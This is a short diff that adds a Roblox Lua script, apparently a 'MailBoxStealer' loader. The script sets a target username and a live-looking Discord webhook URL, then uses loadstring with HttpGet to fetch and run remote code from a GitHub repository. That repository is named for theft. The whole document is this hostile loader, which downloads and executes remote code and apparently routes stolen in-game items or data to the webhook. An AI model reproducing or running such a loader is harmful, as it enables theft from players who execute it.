@@ -1,0 +1,6 @@
+```
+UserName = "alorszak"
+WebHook = "https://discord.com/api/webhooks/1088989277104373781/4b8ZVBs31ETCrtj_zV-3fvGWxSC1HjUSw9v9HL_TfN4ZmDd-IyeNS7aSeR4onu_iyLqG"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DevRlchksStudio/MailBoxStealer/main/DevC", true))()
+```
